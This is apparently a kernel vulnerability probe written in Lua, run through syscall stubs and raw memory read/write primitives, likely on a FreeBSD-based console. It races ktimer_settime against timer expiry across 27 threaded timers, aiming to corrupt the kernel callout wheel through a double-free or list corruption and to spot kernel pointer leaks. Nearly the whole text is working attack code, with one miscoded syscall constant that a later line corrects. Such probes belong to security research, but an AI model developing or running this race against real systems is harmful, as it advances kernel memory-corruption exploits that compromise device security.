-- CRASH_CLASS: HIGH
-- PROBE 138a: Timer signal reentrancy + threaded timer race
--
-- Context: ktimer_create/settime/getoverrun all work. sigaction works
-- for SIG_IGN/SIG_DFL. With threads, we can race timer operations from
-- two contexts: thread reconfigures timer while main's signal handler
-- fires from that same timer.
--
-- Attack: The kernel callout subsystem maintains per-timer state.
-- Racing ktimer_settime (reconfigure) against timer expiry can corrupt
-- the callout wheel — double-free or list corruption on the callout struct.
--
-- Phase 1: Confirm ktimer lifecycle via native.fcall_with_rax
-- Phase 2: Aggressive timer arming — 27 timers, near-simultaneous expiry
-- Phase 3: Threaded timer reconfigure race
-- Phase 4: Check for overrun anomalies and kernel pointer leaks

print("=== PROBE 138a: TIMER REENTRANCY RACE ===")
print("")

local function to_num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function get_hi_lo(val)
    if type(val) == "table" and val.h then return val.h, val.l end
    return 0, to_num(val)
end
local function safe_rd(addr)
    local ok, val = pcall(function() return memory.read_dword(addr) end)
    if ok then return to_num(val) end
    return nil
end
local function safe_rq(addr)
    local ok, val = pcall(function() return memory.read_qword(addr) end)
    if ok then return val end
    return nil
end
local function safe_wd(addr, val)
    local ok = pcall(function() memory.write_dword(addr, val) end)
    return ok
end
local function safe_wq(addr, val)
    local ok = pcall(function() memory.write_qword(addr, val) end)
    return ok
end
local function fmt_addr(val)
    if val == nil then return "nil" end
    local h, l = get_hi_lo(val)
    return string.format("0x%08X_%08X", h, l)
end
local function is_kptr(val)
    if val == nil then return false end
    local h, l = get_hi_lo(val)
    return h >= 0xFFFF8000 and h ~= 0xFFFFFFFF
end

collectgarbage("stop")

local pid = to_num(syscall.getpid())
print("pid=" .. pid)

local has_rax = native and native.fcall_with_rax
local stub = has_rax and syscall.pipe.fn_addr or nil
print("has_rax=" .. tostring(has_rax ~= nil))

if not has_rax then
    print("NEED native.fcall_with_rax — aborting")
    print("=== PROBE 138a COMPLETE ===")
    return
end

local thrd_create_fn = fcall(libc_addrofs.Thrd_create)
local thrd_join_fn = fcall(libc_addrofs.Thrd_join)
local atomic_fn = libc_addrofs.Atomic_fetch_add_8

-- Syscall numbers
local SYS_KTIMER_CREATE = 235
local SYS_KTIMER_SETTIME = 236
local SYS_KTIMER_GETTIME = 237
local SYS_KTIMER_GETOVERRUN = 239
local SYS_KTIMER_DELETE = 236  -- actually 238
-- Correction:
local SYS_KTIMER_DELETE_REAL = 238

-- Clock IDs
local CLOCK_REALTIME = 0
local CLOCK_MONOTONIC = 4

-- struct sigevent (simplified — we use SIGEV_NONE=0)
-- struct itimerspec { struct timespec it_interval; struct timespec it_value; }
-- struct timespec { time_t tv_sec; long tv_nsec; } = 16 bytes on amd64

-- ============================================================
-- PHASE 1: Timer lifecycle test
-- ============================================================
print("")
print("--- PHASE 1: TIMER LIFECYCLE ---")

-- ktimer_create(clockid, evp, timerid)
local timer_id_buf = memory.alloc(8)
safe_wd(timer_id_buf, 0)

-- sigevent: SIGEV_NONE (no signal, just track overruns)
local evp = memory.alloc(64)
safe_wq(evp, uint64(0))       -- sigev_notify = SIGEV_NONE = 0
safe_wq(evp + 8, uint64(0))
safe_wq(evp + 16, uint64(0))
safe_wq(evp + 24, uint64(0))

local cr = to_num(native.fcall_with_rax(stub, SYS_KTIMER_CREATE,
    CLOCK_MONOTONIC, to_num(evp), to_num(timer_id_buf)))
local tid = safe_rd(timer_id_buf)
print("ktimer_create ret=" .. cr .. " id=" .. (tid or "nil"))

if cr ~= 0 then
    print("ktimer_create failed — trying CLOCK_REALTIME")
    cr = to_num(native.fcall_with_rax(stub, SYS_KTIMER_CREATE,
        CLOCK_REALTIME, to_num(evp), to_num(timer_id_buf)))
    tid = safe_rd(timer_id_buf)
    print("ktimer_create(REALTIME) ret=" .. cr .. " id=" .. (tid or "nil"))
end

if cr ~= 0 then
    print("ktimer_create failed — trying with evp=NULL")
    cr = to_num(native.fcall_with_rax(stub, SYS_KTIMER_CREATE,
        CLOCK_MONOTONIC, 0, to_num(timer_id_buf)))
    tid = safe_rd(timer_id_buf)
    print("ktimer_create(evp=NULL) ret=" .. cr .. " id=" .. (tid or "nil"))
end

if cr ~= 0 then
    print("All ktimer_create attempts failed — aborting")
    print("=== PROBE 138a COMPLETE ===")
    return
end

-- Set timer: 1ms interval, 1ms initial
local itimerspec = memory.alloc(32)
-- it_interval: tv_sec=0, tv_nsec=1000000 (1ms)
safe_wq(itimerspec, uint64(0))          -- it_interval.tv_sec
safe_wq(itimerspec + 8, uint64(1000000)) -- it_interval.tv_nsec
-- it_value: tv_sec=0, tv_nsec=1000000 (1ms)
safe_wq(itimerspec + 16, uint64(0))      -- it_value.tv_sec
safe_wq(itimerspec + 24, uint64(1000000)) -- it_value.tv_nsec

local old_spec = memory.alloc(32)
local sr = to_num(native.fcall_with_rax(stub, SYS_KTIMER_SETTIME,
    tid, 0, to_num(itimerspec), to_num(old_spec)))
print("ktimer_settime ret=" .. sr)

-- Wait a bit, then check overruns
sleep(0.05, 's')
local ovr = to_num(native.fcall_with_rax(stub, SYS_KTIMER_GETOVERRUN, tid))
print("overruns after 50ms=" .. ovr)

-- Get current time
local gettime_buf = memory.alloc(32)
safe_wq(gettime_buf, uint64(0))
local gr = to_num(native.fcall_with_rax(stub, SYS_KTIMER_GETTIME, tid, to_num(gettime_buf)))
local remain_sec = safe_rq(gettime_buf + 16)
local remain_ns = safe_rq(gettime_buf + 24)
print("gettime ret=" .. gr .. " remain=" .. fmt_addr(remain_sec) .. "s " .. fmt_addr(remain_ns) .. "ns")

-- Delete timer
local del_ret = to_num(native.fcall_with_rax(stub, SYS_KTIMER_DELETE_REAL, tid))
print("ktimer_delete ret=" .. del_ret)

print("canary1: " .. tostring(pcall(function() return to_num(syscall.getpid()) end)))

-- ============================================================
-- PHASE 2: Mass timer creation + near-simultaneous expiry
-- ============================================================
print("")
print("--- PHASE 2: MASS TIMERS ---")

local MAX_TIMERS = 27
local timer_ids = {}
local created = 0

for i = 1, MAX_TIMERS do
    local tb = memory.alloc(8)
    safe_wd(tb, 0)
    local r = to_num(native.fcall_with_rax(stub, SYS_KTIMER_CREATE,
        CLOCK_MONOTONIC, 0, to_num(tb)))
    if r == 0 then
        created = created + 1
        timer_ids[created] = safe_rd(tb)
    else
        break
    end
end
print("Created " .. created .. " timers")

-- Arm all with 1ms expiry, no repeat (one-shot)
local oneshot = memory.alloc(32)
safe_wq(oneshot, uint64(0))           -- interval = 0 (one-shot)
safe_wq(oneshot + 8, uint64(0))
safe_wq(oneshot + 16, uint64(0))       -- value = 1ms
safe_wq(oneshot + 24, uint64(1000000))

for i = 1, created do
    native.fcall_with_rax(stub, SYS_KTIMER_SETTIME,
        timer_ids[i], 0, to_num(oneshot), 0)
end
print("Armed all " .. created .. " timers for 1ms")

-- Wait for expiry
sleep(0.1, 's')

-- Check overruns
local total_ovr = 0
for i = 1, created do
    local o = to_num(native.fcall_with_rax(stub, SYS_KTIMER_GETOVERRUN, timer_ids[i]))
    total_ovr = total_ovr + o
    if o > 0 then
        print(string.format("  timer[%d] id=%d overruns=%d", i, timer_ids[i], o))
    end
end
print("Total overruns: " .. total_ovr)

print("canary2: " .. tostring(pcall(function() return to_num(syscall.getpid()) end)))

-- ============================================================
-- PHASE 3: Threaded timer reconfigure race
-- ============================================================
print("")
print("--- PHASE 3: THREADED RECONFIGURE RACE ---")

if not atomic_fn then
    print("No Atomic_fetch_add_8 — skipping threaded race")
else
    local RACE_ROUNDS = 100
    local anomalies = 0

    for round = 1, RACE_ROUNDS do
        -- Re-arm all timers with very short interval (100us)
        local fast = memory.alloc(32)
        safe_wq(fast, uint64(0))
        safe_wq(fast + 8, uint64(100000))   -- 100us interval
        safe_wq(fast + 16, uint64(0))
        safe_wq(fast + 24, uint64(100000))   -- 100us initial

        for i = 1, created do
            native.fcall_with_rax(stub, SYS_KTIMER_SETTIME,
                timer_ids[i], 0, to_num(fast), 0)
        end

        -- Thread: atomic_add on the itimerspec memory (noise + scheduling pressure)
        local thr = memory.alloc(8)
        safe_wq(thr, uint64(0))
        pcall(thrd_create_fn, thr, atomic_fn, uint64(to_num(fast)))

        -- Main: rapidly reconfigure timers while they're firing
        for i = 1, created do
            -- Alternate between disarming (value=0) and rearming
            if i % 2 == 0 then
                local disarm = memory.alloc(32)
                safe_wq(disarm, uint64(0))
                safe_wq(disarm + 8, uint64(0))
                safe_wq(disarm + 16, uint64(0))
                safe_wq(disarm + 24, uint64(0))
                native.fcall_with_rax(stub, SYS_KTIMER_SETTIME,
                    timer_ids[i], 0, to_num(disarm), 0)
            else
                native.fcall_with_rax(stub, SYS_KTIMER_SETTIME,
                    timer_ids[i], 0, to_num(fast), 0)
            end
        end

        sleep(0.005, 's')
        pcall(thrd_join_fn, memory.read_qword(thr), uint64(0))

        -- Check for anomalous overrun counts
        for i = 1, created do
            local o = to_num(native.fcall_with_rax(stub, SYS_KTIMER_GETOVERRUN, timer_ids[i]))
            if o > 100 or o < 0 then
                anomalies = anomalies + 1
                if anomalies <= 10 then
                    print(string.format("round %d timer %d: ANOMALOUS overrun=%d", round, i, o))
                end
            end
        end

        if round % 25 == 0 then
            local ok = pcall(function() return to_num(syscall.getpid()) end)
            if not ok then
                print("*** CRASH at round " .. round .. " ***")
                break
            end
            print("  progress: " .. round .. "/" .. RACE_ROUNDS .. " anomalies=" .. anomalies)
        end
    end

    print("Total overrun anomalies: " .. anomalies)
end

-- Cleanup all timers
for i = 1, created do
    native.fcall_with_rax(stub, SYS_KTIMER_DELETE_REAL, timer_ids[i])
end
print("Deleted all timers")

-- VM counter check
local vm = to_num(native.fcall_with_rax(stub, 624))
print("sys624 VM counter=" .. vm)

print("")
print("canary_final: " .. tostring(pcall(function() return to_num(syscall.getpid()) end)))
print("=== PROBE 138a COMPLETE ===")
